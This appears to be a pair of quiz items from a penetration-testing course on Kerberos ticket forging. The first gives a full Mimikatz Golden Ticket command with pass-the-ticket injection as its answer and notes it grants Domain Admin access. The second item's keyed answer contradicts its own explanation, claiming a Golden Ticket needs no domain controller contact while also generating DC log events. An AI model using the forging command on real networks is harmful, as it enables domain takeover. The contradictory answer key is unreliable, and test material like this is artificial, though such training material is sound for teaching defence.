{"module_id":26,"type":"fill_command","difficulty":"hard","prompt":"Write the Mimikatz command to create a Golden Ticket for FakeAdmin in corp.local (domain SID: S-1-5-21-1234567890-1234567890-1234567890) using krbtgt NTLM hash AABBCCDDEEFF0011, and inject it into the current session:","options":None,"answer":"kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:AABBCCDDEEFF0011 /ptt","explanation":"/ptt (pass-the-ticket) immediately injects the forged TGT into the current Kerberos session. Without /ptt, Mimikatz saves the ticket to a file for later import. After injection, access any domain resource as Domain Admin.","validation_regex":"kerberos::golden.*FakeAdmin.*corp\\.local.*S-1-5-21.*krbtgt.*ptt","hints":["/ptt injects the ticket immediately","/krbtgt is the krbtgt NTLM hash, not the plaintext password"]},
{"module_id":26,"type":"multiple_choice","difficulty":"medium","prompt":"What is the key difference between a Golden Ticket and a Silver Ticket in terms of logging and detectability?","options":["Golden is harder to detect","Silver Ticket contacts the DC for validation — more logged","Golden Ticket requires no DC contact and logs Event 4768; Silver Ticket accesses services directly without DC contact — avoids KDC logs","They log identically"],"answer":"Golden Ticket requires no DC contact and logs Event 4768; Silver Ticket accesses services directly without DC contact — avoids KDC logs","explanation":"Golden Ticket: forged TGT that must be presented to the DC for a TGS (generates 4768/4769 events). Silver Ticket: forged TGS for a specific service — presented directly to the service, no DC involved, no KDC log event. Silver tickets are stealthier for specific service access.","validation_regex":None,"hints":["Which ticket type never contacts the domain controller?","Where does the service validation happen for a Silver Ticket?"]},
